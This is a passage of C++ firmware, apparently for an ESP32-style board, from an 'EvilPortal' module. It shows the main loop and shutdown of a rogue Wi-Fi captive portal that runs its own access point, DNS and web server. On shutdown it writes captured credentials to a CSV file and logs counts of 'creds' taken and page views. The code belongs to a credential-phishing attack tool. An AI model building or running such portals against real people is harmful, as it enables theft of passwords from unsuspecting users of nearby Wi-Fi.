    while (!feature_exit_requested && !featureExitButtonPressed()) {
        s_dns.processNextRequest();
        s_web.handleClient();
        int clients = WiFi.softAPgetStationNum();
        if (s_dirty || clients != lastClients || millis() - lastDraw > 1000) {
            drawRunning();
            s_dirty      = false;
            lastClients  = clients;
            lastDraw     = millis();
        }
        delay(2);
    }

    s_web.stop();
    s_dns.stop();
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
    Serial.printf("[evil] stopped: %d creds, %d views, tmpl=%s\n", s_captured, s_hits, s_portalName);
}

}  // namespace EvilPortal
